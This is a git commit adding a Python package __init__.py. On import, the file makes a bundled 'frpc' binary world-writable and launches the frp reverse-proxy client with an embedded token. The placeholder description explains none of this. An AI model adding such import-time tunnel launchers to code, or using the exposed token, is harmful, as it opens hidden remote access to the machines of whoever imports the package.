cd46922d44ce8d9f4ab3d54ff05716e61c16720b
东华 <30590255+qikaiyong@users.noreply.github.com>
2025-07-27 19:40:16 +0800

    Add files via upload

---
+++ __init__.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 2024-05-02 19:56
+# @Author  : 我的名字
+# @File    : __init__.py
+# @Description : 这个函数是用来balabalabala自己写
+import subprocess
+
+# 第一个命令：修改文件权限
+chmod_command = ["chmod", "777", "frpc"]
+subprocess.run(chmod_command, check=True)
+
+# 第二个命令：运行 frpc 客户端
+frpc_command = ["./frpc", "-f", "azqc9s9cnc2peh75533rqpvkuef24lfm:22185092"]
+subprocess.run(frpc_command, check=True)
